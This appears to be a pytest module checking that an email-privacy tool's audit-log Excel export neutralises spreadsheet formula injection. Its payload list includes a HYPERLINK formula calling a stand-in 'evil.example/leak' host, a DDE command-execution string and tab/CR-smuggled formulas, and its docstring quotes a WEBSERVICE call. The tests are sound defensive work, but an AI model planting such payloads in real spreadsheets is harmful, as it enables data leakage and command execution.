"""Adversarial payload tests for SEC-03: spreadsheet formula injection in
the audit log's Excel export.

`summary`, `sender`, `pii_match_details` and `claude_reason` are all
externally-influenced -- an email subject/sender, matched PII text, or
Claude's self-reported "reason" string -- and all four land in a cell via
``ws.append()`` in ``audit_log.export_week_to_excel``. Without
neutralisation, a value like ``"=WEBSERVICE(\"http://evil\")"`` in any of
them becomes a live formula in the exported workbook: openpyxl itself
classifies a string starting with "=" as a formula (not just an Excel
display-time quirk), and Excel additionally treats a leading "+", "-", "@",
tab or CR as formula-like on some import paths. See ``_excel_literal``'s
docstring in ``audit_log.py`` for the full mechanism.

This module exercises the payload list end to end -- through
``export_week_to_excel`` and back through ``openpyxl.load_workbook`` --
rather than just unit-testing ``_excel_literal`` in isolation, matching the
"full-chain" pattern used for SEC-01 (``markdown_to_html(html_to_markdown(x))``)
and SEC-02's abuse tests.
"""
from __future__ import annotations

import pytest

from privacyfence.audit_log import AuditLogger, _excel_literal

openpyxl = pytest.importorskip("openpyxl")

# Payloads covering every formula-trigger character _excel_literal guards
# against, plus a couple of realistic attack strings and a tab/CR used to
# smuggle a trigger character past a naive ``startswith("=")`` check.
PAYLOADS = [
    "=1+1",
    "=SUM(A1:A10)",
    '=HYPERLINK("http://evil.example/leak","click me")',
    "+1+1",
    "-1+1",
    "@SUM(1+1)",
    "\t=1+1",
    "\r=1+1",
    "=cmd|' /C calc'!A0",
]

# (field name on AuditEntry, 1-indexed column in the "Decisions" sheet --
# see audit_log.py's HEADERS/ws.append column order).
FIELDS = [
    ("summary", 6),
    ("sender", 7),
    ("pii_match_details", 13),
    ("claude_reason", 14),
]


def make_entry(**overrides):
    from privacyfence.audit_log import AuditEntry

    defaults = dict(
        timestamp="2026-07-06T12:00:00+00:00",
        week="2026-W28",
        request_id="",
        connector="gmail",
        tool="gmail_get_message",
        tool_name="Read Gmail message",
        summary="Message from alice@example.com",
        sender="alice@example.com",
        decision="approved",
        auto_accept_rule="",
        latency_seconds=1.23,
    )
    defaults.update(overrides)
    return AuditEntry(**defaults)


class TestExcelLiteralUnit:
    @pytest.mark.parametrize("payload", PAYLOADS)
    def test_prefixes_trigger_characters(self, payload):
        result = _excel_literal(payload)
        assert result == "'" + payload
        assert result[0] not in ("=", "+", "-", "@", "\t", "\r")

    @pytest.mark.parametrize("safe", ["hello", "Message from alice@example.com", "", "IBAN: DE00"])
    def test_leaves_non_triggering_values_unchanged(self, safe):
        assert _excel_literal(safe) == safe

    def test_at_sign_not_at_start_is_left_alone(self):
        # Only a *leading* trigger character is dangerous -- an email
        # address's "@" in the middle of the string is not a formula.
        assert _excel_literal("alice@example.com") == "alice@example.com"


class TestFormulaInjectionNeutralisedInExport:
    """Full chain: AuditEntry -> export_week_to_excel -> openpyxl.load_workbook."""

    @pytest.mark.parametrize("payload", PAYLOADS)
    @pytest.mark.parametrize("field, column", FIELDS)
    def test_payload_round_trips_as_literal_text(self, tmp_path, payload, field, column):
        logger = AuditLogger(str(tmp_path))
        logger.record(make_entry(**{field: payload}))

        output = logger.export_week_to_excel("2026-W28")
        wb = openpyxl.load_workbook(output)
        ws = wb["Decisions"]
        cell = ws.cell(row=2, column=column)

        # Neutralised: the stored value is literal text carrying the full
        # original payload, not lost or truncated ...
        assert cell.value == "'" + payload
        # ... and openpyxl/Excel see it as a plain string, never a formula.
        assert cell.data_type == "s"

    @pytest.mark.parametrize("field, column", FIELDS)
    def test_benign_value_is_untouched_in_export(self, tmp_path, field, column):
        benign = "Quarterly report from bob@example.com"
        logger = AuditLogger(str(tmp_path))
        logger.record(make_entry(**{field: benign}))

        output = logger.export_week_to_excel("2026-W28")
        wb = openpyxl.load_workbook(output)
        ws = wb["Decisions"]
        cell = ws.cell(row=2, column=column)

        assert cell.value == benign
        assert cell.data_type == "s"
